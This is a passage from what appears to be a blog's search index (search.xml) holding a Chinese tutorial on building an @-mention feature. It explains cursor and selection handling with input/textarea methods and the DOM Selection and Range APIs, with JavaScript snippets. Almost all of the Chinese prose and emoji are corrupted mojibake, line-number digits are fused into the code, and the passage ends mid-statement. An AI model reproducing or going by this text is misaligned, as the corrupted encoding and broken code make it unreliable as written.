<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[realize-at]]></title>
    <url>%2F2022%2F09%2F15%2Frealize-at%2F</url>
    <content type="text"><![CDATA[èƒŒæ™¯ä¸€å¤©äº§å“å¤§å¤§å‘ boss æ±‡æŠ¥å®Œç ”å‘æˆæžœå’Œäº§å“ä¸šç»©äº§å‡ºï¼Œè‹¥æœ‰æ‰€æ€çš„èµ°å‡ºæ¥ï¼ŒåŠ²ç›´å‘æˆ‘èµ°è¿‡æ¥ï¼Œå˜´è§’å¾®å¾®ä¸Šæ‰¬ã€‚äº§å“å¤§å¤§ï¼šboss å¯¹æˆ‘ä»¬çš„ç ”å‘æˆæžœæŒºæ»¡æ„çš„ï¼Œbalabalaâ€¦ï¼ˆå†…å¿ƒ OSï¼šä¸å¬ï¼Œè®²é‡ç‚¹ï¼‰äº§å“å¤§å¤§ï¼šå’±ä»¬çš„å®¢æœ IM æ¡Œé¢å®¢æˆ·ç«¯çŽ°åœ¨å·²ç»æœ‰èƒ½åŠ›åšåˆ° 1 å¯¹å¤šæŽ¥å¾…åœ¨çº¿è®¿å®¢äº†ï¼ŒåŽé¢æˆ‘ä»¬æƒ³è¦å°†ä¸“é¡¹é—®é¢˜è®¿å®¢åœ¨å½“å‰æŽ¥å¾…å®¢æœä¸èƒ½è§£å†³çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‹‰ä¸“é¡¹å®¢æœå‘èµ·ç¾¤èŠã€‚æˆ‘ï¼šå—¯ï¼Œè¿™ä¸ªæƒ³æ³•ä¸é”™ï¼Œä¸“é¡¹å®¢æœè¿˜èƒ½ä¸€çœ¼çœ‹åˆ°ä¹‹å‰å¯¹è¯ä¸Šä¸‹æ–‡ï¼Œè®¿å®¢è¿˜æ— é¡»é‡æ–°å‘èµ·èŠå¤©ã€‚å“’å“’å“’ï¼ŒåŠŸèƒ½åšå®Œäº†ï¼Œä¸¤å‘¨åŽä¸Šçº¿éªŒæ”¶ï¼Œå®¢æˆ·å¾ˆæ»¡æ„ï¼Œboss åœ¨ç¾¤é‡Œä¹Ÿç‚¹äº†ä¸ª ðŸ‘ðŸ»ã€‚äº§å“å¤§å¤§åˆæ¥äº†ï¼šå—¯ï¼Œè¿™ä¸ªåŠŸèƒ½ä¸é”™ï¼Œæˆ‘ä»¬ä¹Ÿæ”¯æŒç»™å®¢æœè‡ªå·±ç¾¤èŠå§ï¼Œæœ‰åŠ©äºŽå®¢æœç¾¤ä½“æ²Ÿé€šå’Œé—®é¢˜åé¦ˆã€‚æˆ‘ï¼šå—¯ï¼Œè¿™ä¸ªæƒ³æ³•ä¹Ÿä¸é”™ï¼Œç¾¤èŠçš„å†…å®¹ä¹Ÿæœ‰åŠ©äºŽåŽæœŸçš„ç”¨æˆ·å£°éŸ³æ•°æ®æŒ–æŽ˜ã€‚å“å“å“ï¼Œåšå¥½äº†ï¼Œä¸Šçº¿ï¼Œè°ƒæ•´å¥½å¿ƒæ€ï¼Œé™ç­‰è¢«å„è·¯å¤§ä½¬ ðŸ‘ðŸ» æ·¹æ²¡ã€‚å®¢æœ Aï¼šæžæ¯›å•Šï¼Œä½ ä»¬ç¾¤èŠéƒ½ä¸ç»™ä¸ª@åŠŸèƒ½ï¼Œæˆ‘æ€Žä¹ˆ diao ä½ ä»¬ç ”å‘å•Šã€‚å®¢æœ B/C/Dï¼šâž•10086ã€‚æˆ‘ï¼šã€‚ã€‚ã€‚å“ˆå“ˆå“ˆï¼Œä¸Šé¢çš„è™šæ‹Ÿåœºæ™¯çº¯å±žå¥½çŽ©ï¼Œä¸‹é¢å°±æ€Žæ ·å®Œç¾Žçš„å®žçŽ°ä¸€ä¸ª@åŠŸèƒ½å±•å¼€ï¼ŒåŒ…æ•™åŒ…ä¼šã€‚åœ¨è¿›å…¥æ­£é¢˜ä¹‹å‰ï¼Œå’±ä»¬å…ˆé¢„å¤‡ä¸€äº›å¯¹å…‰æ ‡é€‰åŒºçš„â€œåŸºæ“â€çŸ¥è¯†ã€‚è€Œå¯¹å…‰æ ‡é€‰åŒºçš„æ“ä½œåœ¨é¡µé¢ä¸Šçš„å…ƒç´ å¤§è‡´åˆ†ä¸ºä¸¤å¤§ç±»ï¼štext/textarea æ–‡æœ¬è¾“å…¥æ¡†å…ƒç´ å’Œå¯Œæ–‡æœ¬å…ƒç´ ã€‚ä¸‹é¢åˆ†åˆ«å¯¹ä¸€äº›å¸¸ç”¨ API è¿›è¡Œç®€å•ä»‹ç»ã€‚ text/textarea æ–‡æœ¬è¾“å…¥æ¡†ä¸­æ“ä½œå…‰æ ‡é€‰åŒºé¦–å…ˆçœ‹è¿™ç±»æ“ä½œæ–¹å¼ï¼Œå‡ ä¹Žå¯ä»¥ä¸ç”¨ Selectionå’Œ Rangeç›¸å…³ APIï¼Œä½¿ç”¨çš„æ˜¯æ–‡æœ¬è¾“å…¥æ¡†å…ƒç´ åŽŸç”Ÿæ–¹æ³•ã€‚ ä¸»åŠ¨é€‰ä¸­æŸä¸€åŒºåŸŸä¸»åŠ¨é€‰ä¸­åœ¨æ–‡æœ¬è¾“å…¥æ¡†å…ƒç´ æŸä¸€åŒºåŸŸå¯ä»¥ä½¿ç”¨ setSelectionRange ã€‚ element.setSelectionRange(selectionStart, selectionEnd [, selectionDirection]); selectionStart è¢«é€‰ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ç´¢å¼•ï¼Œä»Ž 0 å¼€å§‹ã€‚ selectionEnd è¢«é€‰ä¸­çš„æœ€åŽä¸€ä¸ªå­—ç¬¦çš„ ä¸‹ä¸€ä¸ª ä½ç½®ç´¢å¼•ã€‚ selectionDirection é€‰æ‹©æ–¹å‘çš„å­—ç¬¦ä¸²ã€‚ 123$input.setSelectionRange(0, 6)// $input.select() // å…¨éƒ¨é€‰ä¸­$input.focus() èšç„¦åˆ°æŸä¸€ä½ç½®å¦‚æžœæˆ‘ä»¬æƒ³æŠŠå…‰æ ‡ç§»åŠ¨åˆ° ðŸ˜ƒðŸ˜„ðŸ˜ åŽé¢ï¼Œå…¶å®žæ˜¯å°†é€‰åŒºèµ·å§‹ä½ç½®è®¾ç½®ç›¸åŒçš„æ•ˆæžœ 12$input.setSelectionRange(6, 6)$input.focus() è¿˜åŽŸä¹‹å‰çš„é€‰åŒºæœ‰äº›åœºæ™¯ï¼Œæˆ‘ä»¬é€‰æ‹©äº†å½“å‰inputæ–‡æœ¬æ¡†é€‰åŒºï¼Œè¦åŽ»åšåˆ«çš„æ“ä½œï¼Œå›žæ¥åŽè¦æ¢å¤é€‰åŒºï¼Œè¿™æ—¶åœ¨åšåˆ«çš„æ“ä½œä¹‹å‰å°±è¦å°†é€‰åŒºä½ç½®å­˜ä¸‹æ¥ï¼Œä¼šç”¨åˆ°selectionStartå’Œ selectionEndä¸¤ä¸ªå±žæ€§ã€‚ 12345678910$input.addEventListener('mouseup', () =&gt; &#123; this.pos = &#123; start: $input.selectionStart, end: $input.selectionEnd &#125;&#125;)const &#123; start, end &#125; = this.pos$input.setSelectionRange(start, end)$input.focus() åœ¨æŒ‡å®šé€‰åŒºæ’å…¥ï¼ˆæ›¿æ¢ï¼‰å†…å®¹æŒ‡å®šæ–‡æœ¬è¾“å…¥æ¡†çš„æŸä¸ªä½ç½®æ’å…¥å†…å®¹æˆ–è€…æ›¿æ¢é€‰åŒºçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ setRangeText å®žçŽ°ã€‚ setRangeText(replacement)setRangeText(replacement, start, end, selectMode) è¿™ä¸ªæ–¹æ³•æœ‰ 2 ç§å½¢å¼ï¼Œç¬¬äºŒç§å½¢å¼æœ‰ 4 ä¸ªå‚æ•°ï¼š ç¬¬ä¸€ä¸ªå‚æ•°replacementæ˜¯æ›¿æ¢æ–‡æœ¬ï¼› startå’Œ endæ˜¯èµ·å§‹ä½ç½®ï¼Œé»˜è®¤å€¼è¯¥å…ƒç´ å½“å‰é€‰ä¸­çš„åŒºåŸŸçš„ä½ç½®ï¼› æœ€åŽä¸€ä¸ªå‚æ•°selectModeæ˜¯æ›¿æ¢åŽé€‰åŒºçš„çŠ¶æ€ï¼Œå®ƒæœ‰ 4 ä¸ªçŠ¶æ€ï¼šselectï¼ˆæ›¿æ¢åŽé€‰ä¸­ï¼‰ã€startï¼ˆæ›¿æ¢åŽå…‰æ ‡ä½äºŽæ›¿æ¢è¯ä¹‹å‰ï¼‰ã€endï¼ˆæ›¿æ¢åŽå…‰æ ‡ä½äºŽæ›¿æ¢è¯ä¹‹åŽï¼‰å’Œ preserveï¼ˆé»˜è®¤å€¼ï¼Œå°è¯•ä¿ç•™é€‰åŒºï¼‰ï¼› æˆ‘ä»¬å°†å…‰æ ‡æˆ–è€…é€‰åŒºä½ç½®æ’å…¥æˆ–è€…æ›¿æ¢æ–‡æœ¬ ðŸ˜‚ðŸ˜‚ðŸ˜‚ï¼Œå¯ä»¥è¿™æ · 12$input.setRangeText('ðŸ˜‚ðŸ˜‚ðŸ˜‚')$input.focus() ä¸‹é¢å†æ¥çœ‹çœ‹ç¬¬äºŒç§æœ‰ 4 ä¸ªå‚æ•°å½¢å¼ï¼Œå‘çŽ°ä¼šåœ¨æˆ‘ä»¬æŒ‡å®šçš„èµ·å§‹ä½ç½®æ’å…¥å†…å®¹åŽï¼Œå½“å‰çš„é€‰åŒºå’Œå…‰æ ‡å°è¯•ä¿ç•™ã€‚æ›¿æ¢åŽé€‰åŒºçš„çŠ¶æ€å¦å¤– 3 ç§åœºæ™¯å¤§å®¶å¯ä»¥è‡ªè¡Œæµ‹è¯•ã€‚ 12$input.setRangeText('ðŸ˜‚ðŸ˜‚ðŸ˜‚', 8, 8, 'preserve')$input.focus() å…³äºŽé€‰åŒºçš„æ“ä½œåœ¨ input/textarea è¾“å…¥æ¡†ä¸­çš„æ“ä½œå¸¸ç”¨çš„å·®ä¸å¤šå°±è¿™äº›ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ å¯Œæ–‡æœ¬ä¸­æ“ä½œå…‰æ ‡é€‰åŒºâ€”â€”Selection &amp; Rangeè®¾ç½®å¯Œæ–‡æœ¬é¦–å…ˆå¯Œæ–‡æœ¬å…ƒç´ æ˜¯å¯ç¼–è¾‘å…ƒç´ ï¼Œå¯ä»¥åœ¨å…ƒç´ ä¸Šçœ‹åˆ°å…‰æ ‡ï¼Œé™¤äº†è¡¨å•å…ƒç´ ï¼Œè¿˜æœ‰ç»™æ™®é€šå…ƒç´ æ·»åŠ å±žæ€§å¯ä»¥è½¬æ¢æ–‡å¯Œæ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸‹ä¸‰ç§æ–¹å¼è½¬æ¢ã€‚ ç»™å…ƒç´ æ·»åŠ å±žæ€§ contenteditable=&quot;true&quot;ï¼› æ·»åŠ  CSS å±žæ€§ -webkit-user-modify: &quot;read-write&quot;ï¼› é€šè¿‡ js çš„ document.designMode=&quot;on&quot;æ–¹å¼è®¾ç½®ï¼› Selection &amp; Rangeåœ¨å¯Œæ–‡æœ¬ä¸­å¯¹å…‰æ ‡åŠé€‰åŒºçš„æ“ä½œï¼Œä¸å¾—ä¸æ JavaScript çš„ä¸¤ä¸ªåŽŸç”Ÿå¯¹è±¡ï¼š Selection å’Œ Range ã€‚ Selection å¯¹è±¡è¡¨ç¤ºç”¨æˆ·é€‰æ‹©çš„æ–‡æœ¬èŒƒå›´æˆ–æ’å…¥ç¬¦å·çš„å½“å‰ä½ç½®ã€‚å®ƒä»£è¡¨é¡µé¢ä¸­çš„æ–‡æœ¬é€‰åŒºï¼Œå¯èƒ½æ¨ªè·¨å¤šä¸ªå…ƒç´ ã€‚æ–‡æœ¬é€‰åŒºç”±ç”¨æˆ·æ‹–æ‹½é¼ æ ‡ç»è¿‡æ–‡å­—è€Œäº§ç”Ÿã€‚è¦èŽ·å–ç”¨äºŽæ£€æŸ¥æˆ–ä¿®æ”¹çš„ Selection å¯¹è±¡ï¼Œè¯·è°ƒç”¨ window.getSelection()ã€‚ Range å¯¹è±¡è¡¨ç¤ºåŒ…å«èŠ‚ç‚¹å’Œéƒ¨åˆ†æ–‡æœ¬èŠ‚ç‚¹çš„æ–‡æ¡£ç‰‡æ®µã€‚é€šè¿‡ selectionå¯¹è±¡èŽ·å¾—çš„ rangeå¯¹è±¡æ‰æ˜¯æˆ‘ä»¬æ“ä½œå…‰æ ‡çš„é‡ç‚¹ã€‚ å¤§å®¶å¯èƒ½æ³¨æ„åˆ° getRangeAt(0)ï¼Œé€‰åŒºå¯èƒ½ä¼šæœ‰å¤šä¸ª range? è¿˜çœŸæ˜¯ï¼Œåœ¨ Firefox æ”¯æŒå¤šä¸ªé€‰åŒºï¼Œé€šè¿‡ cmdé”®ï¼ˆwindowsä¸Šæ˜¯ ctrlé”®ï¼‰å¯ä»¥å®žçŽ°å¤šé€‰åŒºã€‚å†çœ‹ä¸€ä¸ª range è¿”å›žçš„ä¸€ä¸ªå±žæ€§ï¼Œcollapsedï¼Œè¡¨ç¤ºé€‰åŒºçš„èµ·ç‚¹ä¸Žç»ˆç‚¹æ˜¯å¦é‡å ã€‚å½“collapsedä¸ºtrueæ—¶ï¼Œé€‰ä¸­åŒºåŸŸè¢«åŽ‹ç¼©æˆä¸€ä¸ªç‚¹ï¼Œå¯¹äºŽæ™®é€šçš„å…ƒç´ ï¼Œå¯èƒ½ä»€ä¹ˆéƒ½çœ‹ä¸åˆ°ï¼Œå¦‚æžœæ˜¯åœ¨å¯ç¼–è¾‘å…ƒç´ ä¸Šï¼Œé‚£è¿™ä¸ªè¢«åŽ‹ç¼©çš„ç‚¹å°±å˜æˆäº†å¯ä»¥é—ªçƒçš„å…‰æ ‡ã€‚ ä¸»åŠ¨é€‰ä¸­å¯Œæ–‡æœ¬çš„æŸä¸ªèŠ‚ç‚¹é€‰ä¸­å¯Œæ–‡æœ¬ä¸­çš„æŸä¸ªç‹¬ç«‹æ ‡ç­¾ï¼Œå¯ä»¥ç”¨åˆ°ä¸¤ä¸ª APIï¼ŒRange.selectNode() å’Œ Range.selectNodeContent()ï¼Œä¸¤è€…ä¸åŒçš„æ˜¯å‰è€…åŒ…æ‹¬èŠ‚ç‚¹è‡ªèº«ï¼ŒåŽè€…ä¸åŒ…æ‹¬è‡ªèº«ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³ç‹¬ç«‹é€‰ä¸­å¯Œæ–‡æœ¬çš„ç¬¬äºŒä¸ªå­å…ƒç´ &lt;span style=&quot;color: #00965e;&quot;&gt;Selection&lt;/span&gt; ï¼Œä½¿ç”¨ Range.selectNode() API é€‰ä¸­å…ƒç´ ï¼Œåˆ é™¤çš„æ˜¯æ•´ä¸ªå…ƒç´ ï¼Œå†è¾“å…¥å†…å®¹æ˜¯æ²¡æœ‰æ ·å¼çš„ã€‚ 1234const $span = $input.childNodes[1]range.selectNode($span)selection.removeAllRanges()selection.addRange(range) å½“ç„¶éƒ¨åˆ†æµè§ˆå™¨ï¼ˆæ¯”å¦‚ Chrome104ï¼‰æ˜¯æœ‰å·®å¼‚çš„ï¼Œåœ¨åˆ é™¤æ•´ä¸ªèŠ‚ç‚¹åŽï¼Œæ–°è¾“å…¥çš„å†…å®¹æ—¶ä¼šæ’å…¥ä¸€ä¸ªæ ‡ç­¾ï¼ˆfontï¼‰å¹¶é›†æˆä¹‹å‰çš„æ ·å¼ã€‚ä½¿ç”¨ Range.selectNodeContents() API é€‰ä¸­çš„æ˜¯èŠ‚ç‚¹å†…éƒ¨å†…å®¹ï¼Œå½“åˆ é™¤é€‰ä¸­å†…å®¹åŽï¼ŒèŠ‚ç‚¹æœ¬èº«è¿˜åœ¨ã€‚ 1234const $span = $input.childNodes[1]range.selectNodeContents($span)selection.removeAllRanges()selection.addRange(range) ä»¥ä¸Šæ˜¯å¯¹å¯Œæ–‡æœ¬ä¸­å•ä¸ªèŠ‚ç‚¹çš„é€‰ä¸­æ“ä½œï¼Œç„¶è€Œï¼Œå®žé™…ä¸Šå¯Œæ–‡æœ¬ä¸­çš„èŠ‚ç‚¹å¯èƒ½æ˜¯åµŒå¥—æˆ–è€…å¹³è¡Œçš„ï¼Œæ€Žæ ·è·¨å¤šä¸ªå…ƒç´ åŽ»é€‰ä¸­æ“ä½œå‘¢ï¼Ÿ ä¸»åŠ¨é€‰ä¸­å¯Œæ–‡æœ¬çš„æŸä¸€åŒºåŸŸè¡¨å•è¾“å…¥æ¡†åªæœ‰å•ä¸€æ–‡æœ¬ï¼Œè€Œå¯Œæ–‡æœ¬å…ƒç´ æˆ–è€…æ™®é€šå…ƒç´ åŒ…å«å¤šä¸ªå…ƒç´ ã€‚å½“ä¸»åŠ¨é€‰ä¸­é¡µé¢æŸä¸€åŒºåŸŸï¼Œå…ˆè¦åˆ›å»ºä¸€ä¸ªRangeå¯¹è±¡ï¼Œå¯èƒ½ä¼šè·¨å¤šä¸ªå…ƒç´ ï¼Œæ‰€ä»¥è¦è®¾ç½®é€‰åŒºçš„èµ·å§‹èŠ‚ç‚¹ï¼Œåˆ†åˆ«æ˜¯ Range.setStart() å’Œ Range.setEnd() æ–¹æ³•ã€‚ range.setStart(startNode, startOffset);range.setEnd(endNode, endOffset); startNode å¼€å§‹èŠ‚ç‚¹ startOffset ä»Ž startNode çš„å¼€å§‹ä½ç½®ç®—èµ·çš„åç§»é‡ endNode ç»“æŸèŠ‚ç‚¹ endOffset ä»Ž endNode çš„ç»“æŸä½ç½®ç®—èµ·çš„åç§»é‡ ä¸Šé¢æ˜¯è®¾ç½®é€‰åŒºèŒƒå›´ï¼Œç„¶åŽå°†å…¶æ·»åŠ åˆ°é€‰åŒºå¹¶é€‰ä¸­ Selection.addRange()ã€‚ä¸è¿‡ï¼Œä¸€èˆ¬åœ¨æ·»åŠ å‰ï¼Œä¼šæ¸…é™¤ä¹‹å‰çš„é€‰åŒºï¼Œè¿™æ—¶å°±è¦ç”¨åˆ° Selection.removeAllRanges() ã€‚ 123456const selection = document.getSelection()const range = document.createRange()range.setStart($input.firstChild, 0)range.setEnd($input.firstChild, 4)selection.removeAllRanges()selection.addRange(range) æ³¨æ„è¿™é‡Œå–å¯Œæ–‡æœ¬å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹ï¼ˆæ–‡æœ¬èŠ‚ç‚¹ï¼‰ï¼Œè€Œä¸æ˜¯å…ƒç´ æœ¬èº«ï¼Œå¦åˆ™å°±ä¼šè¶…å‡ºåç§»é‡ï¼Œå‡ºçŽ°æŠ¥é”™ã€‚å› ä¸ºåœ¨è®¡ç®—å…ƒç´ èŠ‚ç‚¹å’Œæ–‡æœ¬èŠ‚ç‚¹åç§»é‡æ˜¯æœ‰å·®åˆ«çš„ï¼š å¦‚æžœèµ·å§‹èŠ‚ç‚¹ç±»åž‹æ˜¯ Textã€Comment æˆ– CDATASection ä¹‹ä¸€ï¼Œé‚£ä¹ˆ startOffset æŒ‡çš„æ˜¯ä»Žèµ·å§‹èŠ‚ç‚¹ç®—èµ·å­—ç¬¦çš„åç§»é‡ã€‚ å¯¹äºŽå…¶ä»– Node ç±»åž‹èŠ‚ç‚¹ï¼ŒstartOffset æ˜¯æŒ‡ä»Žèµ·å§‹ç»“ç‚¹å¼€å§‹ç®—èµ·å­èŠ‚ç‚¹çš„åç§»é‡ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æžœæˆ‘æƒ³é€‰ä¸­å¯Œæ–‡æœ¬å¼€å¤´è¿™ä¸€æ®µ ðŸ˜ƒðŸ˜„ðŸ˜&lt;span style=&quot;color: #00965e;&quot;&gt;Selection&lt;/span&gt; å¯¹è±¡ï¼Œæ€Žæ ·å®žçŽ°å‘¢ï¼Ÿå¯¹äºŽæ¯”è¾ƒå¤æ‚çš„å¯Œæ–‡æœ¬å…ƒç´ ç»“æž„ï¼Œè¦å®žçŽ°ä»»æ„åŒºé—´é€‰ä¸­ï¼Œå…³é”®è¦æ‰¾åˆ°èµ·å§‹èŠ‚ç‚¹å’Œç»“æŸèŠ‚ç‚¹ï¼Œä»¥åŠå®ƒä»¬å„è‡ªçš„åç§»é‡ã€‚ å¥½åƒæ²¡æœ‰æ›´å¥½çš„åŽŸç”Ÿæ–¹æ³•å¯ä»¥å€ŸåŠ©ï¼Œè¿™é‡Œæœ‰ä¸€ç§æ–¹æ¡ˆï¼Œé¦–å…ˆéåŽ†å‡ºå¯Œæ–‡æœ¬åŒ…å«æ‰€æœ‰çš„æ–‡æœ¬èŠ‚ç‚¹ï¼Œç„¶åŽè®°å½•æ¯ä¸ªèŠ‚ç‚¹è¾¹ç•Œçš„åç§»é‡ï¼ŒæŸ¥æ‰¾å‡ºæ»¡è¶³åŒºé—´æ¡ä»¶çš„èµ·å§‹å’Œç»“æŸèŠ‚ç‚¹ï¼Œæœ€åŽä»Žèµ·å§‹å’Œç»“æŸèŠ‚ç‚¹ä¸­è®¡ç®—å„è‡ªéœ€è¦çš„æ–‡æœ¬åç§»é‡ã€‚ 12345678910111213141516171819202122232425262728293031/** * èŽ·å–æ‰€æœ‰æ–‡æœ¬èŠ‚ç‚¹åŠå…¶åç§»é‡ * @param &#123;HTMLElement&#125; wrapDom æœ€å¤–å±‚èŠ‚ç‚¹ * @param &#123;Number&#125; start å¼€å§‹ä½ç½® * @param &#123;Number&#125; end ç»“æŸä½ç½® * @returns */function getNodeAndOffset(wrapDom, start = 0, end = 0) &#123; const txtList = [] const map = function (children) &#123; ;[...children].forEach((el) =&gt; &#123; if (el.nodeName === '#text') &#123; txtList.push(el) &#125; else &#123; map(el.childNodes) &#125; &#125;) &#125; // é€’å½’éåŽ†ï¼Œæå–å‡ºæ‰€æœ‰ #text map(wrapDom.childNodes) // è®¡ç®—æ–‡æœ¬çš„ä½ç½®åŒºé—´ const clips = txtList.reduce((arr, item, index) =&gt; &#123; const end = item.textContent.length + (arr[index - 1] ? arr[index - 1][2] : 0) arr.push([item, end - item.textContent.length, end]) return arr &#125;, []) // æŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„èŒƒå›´åŒºé—´ const startNode = clips.find((el) =&gt; start &gt;= el[1] &amp;&amp; start &lt; el[2]) const endNode = clips.find((el) =&gt; end &gt;= el[1] &amp;&amp; end &lt; el[2]) return [startNode[0], start - startNode[1], endNode[0], end - endNode[1]]&#125; æœ‰äº†è¿™ä¸ªæˆ‘ä»¬è‡ªå·±å°è£…çš„å·¥å…·æ–¹æ³•ï¼Œå°±å¯ä»¥é€‰ä¸­ä»»æ„æ–‡å­—åŒºé—´ï¼Œè€Œä¸ç”¨è€ƒè™‘å¯Œæ–‡æœ¬çš„å…ƒç´ ç»“æž„ã€‚ 1234567const selection = document.getSelection()const range = document.createRange()const nodes = this.getNodeAndOffset($input, 4, 17)range.setStart(nodes[0], nodes[1])range.setEnd(nodes[2], nodes[3])selection.removeAllRanges()selection.addRange(range) èšç„¦åˆ°æŸä¸€ä½ç½®é€šè¿‡ä¸Šé¢å·²å®žçŽ°é€‰ä¸­ä»»æ„åŒºé—´æ–‡å­—ï¼Œå†æ¥çœ‹å°†å…‰æ ‡èšç„¦åˆ°æŸä¸€ä½ç½®ï¼Œå°±ç®€å•å¤šäº†ï¼Œåªé€‰å°†èµ·å§‹å’Œç»“æŸèŒƒå›´ä½ç½®è®¾ç½®ç›¸åŒå³å¯ã€‚ 1234567const selection = document.getSelection()const range = document.createRange()const nodes = this.getNodeAndOffset($input, 7, 7)range.setStart(nodes[0], nodes[1])range.setEnd(nodes[2], nodes[3])selection.removeAllRanges()selection.addRange(range) è¿˜åŽŸä¹‹å‰çš„é€‰åŒºåŒæ–‡æœ¬è¾“å…¥æ¡†ä¿å­˜å½“å‰çš„å…‰æ ‡ä½ç½®ï¼Œåœ¨å¯Œæ–‡æœ¬é‡Œï¼Œå¯ä»¥å°†æ•´ä¸ªé€‰åŒºéƒ½ä¿å­˜ä¸‹æ¥ï¼Œç„¶åŽåœ¨åŽé¢å¤åŽŸé€‰åŒºã€‚ 1234567891011// ä¿å­˜å…‰æ ‡$input.addEventListener('mouseup', () =&gt; &#123; const selection = document.getSelection() const range = selection.getRangeAt(0) this.lastRange = range&#125;)// è¿˜åŽŸå…‰æ ‡const selection = document.getSelection()const range = document.createRange()selection.removeAllRanges()selection.addRange(this.lastRange) åœ¨æŒ‡å®šé€‰åŒºæ’å…¥ï¼ˆæ›¿æ¢ï¼‰å†…å®¹åœ¨é€‰åŒºæ’å…¥å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ Range.insertNode() æ–¹æ³•ï¼Œå®ƒè¡¨ç¤ºåœ¨é€‰åŒºçš„èµ·ç‚¹å¤„æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä¸”ä¸ä¼šæ›¿æ¢å½“å‰å·²ç»é€‰ä¸­çš„ï¼Œå¦‚æžœéœ€è¦æ›¿æ¢ï¼Œå¯ä»¥å…ˆåˆ é™¤ï¼Œåˆ é™¤é€‰åŒºå¯ä»¥ç”¨ Range.deleteContent() æ–¹æ³•ã€‚ 123const $text = document.createTextNode('ðŸ˜‚ðŸ˜‚ðŸ˜‚')this.lastRange.deleteContents()this.lastRange.insertNode($text) ä»Žä¸Šé¢å®¢æœå‘çŽ°ï¼Œæ’å…¥å†…å®¹åŽï¼Œå†…å®¹æ˜¯è¢«é€‰åŒºé€‰ä¸­çŠ¶æ€ï¼Œå¦‚æžœå¸Œæœ›å…‰æ ‡åœ¨æ’å…¥çš„å†…å®¹åŽé¢ï¼Œå¯ä»¥ä½¿ç”¨ Range.setStartAfter() è®¾ç½®é€‰åŒºçš„èµ·ç‚¹ä¸ºå…ƒç´ çš„åŽé¢ï¼Œé»˜è®¤é€‰åŒºçš„ç»ˆç‚¹åœ¨å…ƒç´ çš„åŽé¢ Range.setEndAfter()ï¼Œæ— é¡»è®¾ç½®ã€‚ 12this.lastRange.setStartAfter($text)$input.focus() åŒæ ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Range.setEndBefore å’Œ setStartBeforeå°†å…‰æ ‡è®¾ç½®åˆ°å†…å®¹çš„å‰é¢ã€‚ ç»™æŒ‡å®šé€‰åŒºåŒ…è£¹æ ‡ç­¾è¿˜æœ‰ä¸€äº›æ¯”è¾ƒé«˜çº§çš„ç”¨æ³•åº”ç”¨ï¼Œæ¯”å¦‚ç»™æŸå¥è¯åŠ èƒŒæ™¯æ ‡è®°æ•ˆæžœï¼Œç±»ä¼¼ word æ–‡æ¡£æ–‡å­—é€‰ä¸­åŠ èƒŒæ™¯è‰²ã€‚å¯ä»¥é€šè¿‡ Range.surroundContents() æ–¹æ³•å®žçŽ°ã€‚ ä¸è¿‡ï¼Œå½“é€‰åŒºåŒ…å«å¤šä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯æ–­å¼€äº†ä¸€ä¸ªéž text èŠ‚ç‚¹ï¼ŒåªåŒ…å«äº†èŠ‚ç‚¹çš„å…¶ä¸­ä¸€ä¸ªè¾¹ç•Œï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚é‚£ä¹ˆæ€Žæ ·å¯ä»¥è§„é¿è¿™ä¸ªé—®é¢˜ï¼Œå®žçŽ°è·¨å¤šä¸ªèŠ‚ç‚¹é€‰ä¸­æ ‡è®°å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ extractContents()ï¼Œå®ƒä¼šå°†æˆ‘ä»¬çš„é€‰åŒºå¤šèŠ‚ç‚¹ç§»åŠ¨åˆ° DocumentFragment å¯¹è±¡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ ä½¿ç”¨ DOM äº‹ä»¶æ·»åŠ çš„äº‹ä»¶ç›‘å¬å™¨åœ¨æå–æœŸé—´ä¸ä¼šä¿ç•™ã€‚HMTL å±žæ€§äº‹ä»¶å°†æŒ‰ Node.cloneNode() æ–¹æ³•åŽŸæ ·ä¿ç•™å’Œå¤åˆ¶ã€‚HTML id å±žæ€§ä¹Ÿä¼šè¢«å…‹éš†ï¼Œå¦‚æžœæå–äº†éƒ¨åˆ†é€‰å®šçš„èŠ‚ç‚¹å¹¶å°†å…¶é™„åŠ åˆ°æ–‡æ¡£ä¸­ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ— æ•ˆçš„æ–‡æ¡£ã€‚ ç”¨æ ‡ç­¾åŒ…è£¹è¯¥æ–‡æ¡£ç‰‡æ®µï¼Œç„¶åŽæ’å…¥ã€‚ 12345const $mark = document.createElement('mark')// this.lastRange.surroundContents($mark)const fragments = this.lastRange.extractContents()$mark.append(fragments)this.lastRange.insertNode($mark) å…‰æ ‡/é€‰åŒºçš„ä½ç½®åæ ‡æœ‰æ—¶æˆ‘ä»¬æƒ³ç¡®å®šæ–‡æœ¬åŒºåŸŸä¸­è¢«é€‰ä¸­çš„éƒ¨åˆ†æˆ–è€…å…‰æ ‡çš„è§†çª—åæ ‡ï¼Œä»¥æ­¤å¯ä»¥å°†ç±»ä¼¼å¤‡æ³¨æˆ–è€…æ‚¬æµ®æ¡†å®šä½åˆ°é™„è¿‘ã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ Range.getBoundingClientRect() APIï¼Œå®ƒè¿”å›žä¸€ä¸ª DOMRect å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°†èŒƒå›´ä¸­çš„å†…å®¹åŒ…å›´èµ·æ¥ï¼›å³è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªå°†èŒƒå›´å†…æ‰€æœ‰å…ƒç´ åŒ…å›´èµ·æ¥çš„çŸ©å½¢ã€‚ 123456const pos = this.lastRange.getBoundingClientRect()const highlight = 